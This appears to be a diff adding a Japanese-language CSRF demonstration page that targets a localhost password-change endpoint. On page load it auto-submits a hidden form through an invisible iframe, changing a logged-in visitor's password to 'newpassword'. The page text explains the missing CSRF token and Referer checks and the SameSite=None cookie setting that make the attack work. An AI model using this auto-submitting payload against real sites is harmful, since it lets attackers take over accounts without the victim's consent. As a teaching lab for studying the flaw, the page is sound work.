@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport"content="width=device-width,initial-scale=1">
+        <link rel="stylesheet" href='main.css' type="text/css">
+        <title>CSRF攻撃ページ</title>
+        <script>
+            const $form = $('#form')
+            $('.btn-send').on('click', evt => {
+            $form.submit()
+            $form[0].reset()
+            return false
+            })
+        </script>
+    </head>
+        <body onload="document.forms[0].submit()">
+            <form id="form" action="http://localhost:8010/change-password.php" method="post" target="sendform">
+                <input type="hidden" name="newpassword" value="newpassword">
+                <button class="btn-send" style="display:none;">送信</button>
+            </form>
+            <iframe name="sendform" style="width:0px;height:0px;border:0px;"></iframe>
+            <section class="main">
+            <h1>CSRF攻撃ページ</h1>
+                <p>
+                    hiddenタグにより隠されているformが送信されるため、localhost:8010のページがログイン状態のままでこのページを訪れると勝手にパスワードをnewpasswordに変更されてしまう。
+                    このような攻撃ができてしまうログインページ側の主な原因として以下があげられる。
+                    <ul>
+                        <li>CSRF対策（CSRFトークン、Refererヘッダーの検証等）が行われていない</li>
+                        <li>SameSite Cookieの設定をNoneに設定している</li>
+                    </ul>
+                    下の写真がこのページに隠されているコードである。
+                </p>
+                <img src="CSRF攻撃説明.png">
+            </section>
+        </body>
+</html>
